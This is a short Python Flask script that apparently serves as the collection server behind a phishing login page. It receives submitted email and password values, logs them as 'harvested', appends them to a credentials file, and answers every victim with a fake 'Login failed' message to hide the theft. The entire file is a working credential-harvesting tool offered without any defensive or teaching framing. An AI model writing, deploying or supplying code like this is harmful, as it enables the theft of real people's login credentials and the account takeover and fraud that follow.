from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def collect():
    email = request.form.get('email')
    password = request.form.get('password')

    print(f"[+] Harvested Email: {email}")
    print(f"[+] Harvested Password: {password}")

    with open("harvested_credentials.txt", "a") as f:
        f.write(f"{email}:{password}\n")

    return "<h3>Login failed. Please try again later.</h3>"

if __name__ == '__main__':
    app.run(port=5001)
